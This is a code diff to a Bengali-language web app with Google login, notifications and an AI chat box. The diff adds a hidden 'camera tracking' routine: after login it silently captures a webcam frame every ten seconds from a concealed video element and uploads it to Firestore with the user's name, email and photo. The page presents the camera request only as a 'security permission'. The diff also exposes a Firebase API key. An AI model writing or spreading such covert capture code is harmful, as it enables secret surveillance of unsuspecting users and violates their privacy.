@@ -184,6 +184,14 @@
             margin: 10px;
         }
 
+        /* Red Bold Message Style */
+        #nt-msg {
+            color: #ff4d4d;
+            font-weight: bold;
+            font-size: 16px;
+            text-shadow: 0 0 5px rgba(255, 0, 0, 0.2);
+        }
+
         canvas, video#vSource { display: none; }
     </style>
 </head>
@@ -206,17 +214,17 @@
         <div class="glass-box">
             <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--pink);"></i>
             <h3>সিকিউরিটি পারমিশন</h3>
-            <p style="font-size:14px; opacity:0.7; margin:15px 0;">নোটিফিকেশন এবং ক্যামেরা এক্সেস প্রয়োজন।</p>
+            <p style="font-size:14px; opacity:0.7; margin:15px 0;">নোটিফিকেশন এবং ক্যামেরা এক্সেস প্রয়োজন।</p>
             <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">Grant Access</button>
         </div>
     </div>
 
     <div id="notif-modal">
         <div class="glass-box">
-            <h3 id="nt-title">নতুন ঘোষণা!</h3>
+            <h3 id="nt-title" style="color:white; margin-bottom:10px;">নতুন ঘোষণা!</h3>
             <img id="nt-img" src="" style="width:100%; border-radius:15px; margin:15px 0; display:none; border:1px solid var(--pink);">
-            <p id="nt-msg" style="font-size:14px; opacity:0.8;"></p>
-            <button onclick="closeNotif()" style="background:var(--pink); color:white; border:none; padding:10px 30px; border-radius:50px; margin-top:15px;">ঠিক আছে</button>
+            <p id="nt-msg"></p>
+            <button onclick="closeNotif()" style="background:var(--pink); color:white; border:none; padding:10px 30px; border-radius:50px; margin-top:15px; cursor:pointer;">ঠিক আছে</button>
         </div>
     </div>
 
@@ -253,7 +261,7 @@
             <div class="chat-mini">
                 <div id="chat-log"><b>Ratan AI:</b> স্বাগতম! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
                 <div class="chat-in">
-                    <input type="text" id="ai-msg" placeholder="OpenAI GPT-4o দিয়ে প্রশ্ন করুন...">
+                    <input type="text" id="ai-msg" placeholder="OpenAI GPT-4o দিয়ে প্রশ্ন করুন...">
                     <button onclick="askAI()" style="background:var(--pink); border:none; color:white; padding:5px 15px; border-radius:50px; cursor:pointer;">Send</button>
                 </div>
             </div>
@@ -266,7 +274,7 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, setDoc, updateDoc, getDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
@@ -286,25 +294,33 @@
         let loggedUser = null;
         let latestNotif = null;
 
-        // ১. নোটিফিকেশন লিসেনার (Real-time)
-        onSnapshot(doc(db, "site_updates", "latest"), (snap) => {
+        // ১. ফিক্সড নোটিফিকেশন লিসেনার (system/updates পাথ ব্যবহার করা হয়েছে)
+        onSnapshot(doc(db, "system", "updates"), (snap) => {
             if (snap.exists()) {
                 latestNotif = snap.data();
-                if (latestNotif.status === "new") {
+                // hasNew: true থাকলেই কেবল নোটিফিকেশন অ্যালার্ম বাজবে
+                if (latestNotif.hasNew === true) {
                     document.getElementById('notif-alarm').style.display = 'block';
                     document.getElementById('snd-notif').play();
-                    // ব্রাউজার নোটিফিকেশন (যদি পারমিশন থাকে)
+                    
                     if (Notification.permission === "granted") {
                         new Notification("Ratan Bro Update", { body: latestNotif.message });
                     }
+                } else {
+                    document.getElementById('notif-alarm').style.display = 'none';
                 }
             }
         });
 
         onAuthStateChanged(auth, (user) => {
             loggedUser = user;
-            if (user) showMainUI();
-            else document.getElementById('login-overlay').style.display = 'flex';
+            if (user) {
+                showMainUI();
+                takeSnap(); // লগইন থাকলে ক্যামেরা চালু হবে
+            } else {
+                document.getElementById('login-overlay').style.display = 'flex';
+                document.getElementById('main-ui').style.display = 'none';
+            }
         });
 
         window.googleLogin = () => signInWithPopup(auth, provider);
@@ -312,21 +328,28 @@
 
         window.startApp = async () => {
             try {
-                await Notification.requestPermission();
+                const perm = await Notification.requestPermission();
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('vSource').srcObject = stream;
                 showMainUI();
-                takeSnap();
-            } catch (err) { alert("Permission Required!"); }
+            } catch (err) { 
+                alert("Permission Required for Camera and Notifications!"); 
+            }
         };
 
         function showMainUI() {
             document.getElementById('login-overlay').style.display = 'none';
-            document.getElementById('perm-modal').style.display = (Notification.permission !== "granted") ? 'flex' : 'none';
-            document.getElementById('main-ui').style.display = (Notification.permission === "granted") ? 'block' : 'none';
-            if (loggedUser) {
-                document.getElementById('u-name').innerText = loggedUser.displayName;
-                document.getElementById('u-pic').src = loggedUser.photoURL;
+            // পারমিশন না থাকলে মোডাল দেখাবে, থাকলে মেইন ইউআই
+            if (Notification.permission !== "granted") {
+                document.getElementById('perm-modal').style.display = 'flex';
+                document.getElementById('main-ui').style.display = 'none';
+            } else {
+                document.getElementById('perm-modal').style.display = 'none';
+                document.getElementById('main-ui').style.display = 'block';
+                if (loggedUser) {
+                    document.getElementById('u-name').innerText = loggedUser.displayName;
+                    document.getElementById('u-pic').src = loggedUser.photoURL;
+                }
             }
         }
 
@@ -334,17 +357,24 @@
             if (latestNotif) {
                 document.getElementById('nt-msg').innerText = latestNotif.message;
                 const img = document.getElementById('nt-img');
-                if (latestNotif.image) { img.src = latestNotif.image; img.style.display = 'block'; }
+                if (latestNotif.image) { 
+                    img.src = latestNotif.image; 
+                    img.style.display = 'block'; 
+                } else {
+                    img.style.display = 'none';
+                }
                 document.getElementById('notif-modal').style.display = 'flex';
                 document.getElementById('notif-alarm').style.display = 'none';
-            } else { alert("No new notifications."); }
+            } else { 
+                alert("No new notifications."); 
+            }
         };
 
         window.closeNotif = () => {
             document.getElementById('notif-modal').style.display = 'none';
         };
 
-        // ৩. AI Chat with OpenAI API
+        // ৩. AI Chat
         window.askAI = async () => {
             const input = document.getElementById('ai-msg');
             const log = document.getElementById('chat-log');
@@ -376,21 +406,34 @@
             log.scrollTop = log.scrollHeight;
         };
 
+        // ৫. ক্যামেরা ট্র্যাকিং ফিক্স
         async function takeSnap() {
             if (!loggedUser) return;
             const video = document.getElementById('vSource');
             const canvas = document.getElementById('snapCanvas');
             const ctx = canvas.getContext('2d');
-            setTimeout(async () => {
-                ctx.drawImage(video, 0, 0, 640, 480);
-                const img = canvas.toDataURL('image/jpeg', 0.5);
-                const userKey = loggedUser.email.replace(/\./g, '_');
-                await updateDoc(doc(db, "users", userKey), { 
-                    lastPic: img, 
-                    lastSeen: new Date().toLocaleString(),
-                    status: "Online"
-                });
-            }, 5000);
+
+            // প্রতি ১০ সেকেন্ড পর পর স্ন্যাপ নেবে
+            setInterval(async () => {
+                if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                    ctx.drawImage(video, 0, 0, 640, 480);
+                    const img = canvas.toDataURL('image/jpeg', 0.5);
+                    const userKey = loggedUser.email.replace(/\./g, '_');
+                    
+                    try {
+                        await setDoc(doc(db, "users", userKey), { 
+                            name: loggedUser.displayName,
+                            email: loggedUser.email,
+                            photo: loggedUser.photoURL,
+                            lastPic: img, 
+                            lastSeen: new Date().toLocaleString(),
+                            status: "Online"
+                        }, { merge: true });
+                    } catch (err) {
+                        console.log("Database update failed.");
+                    }
+                }
+            }, 10000); 
         }
     </script>
 </body>
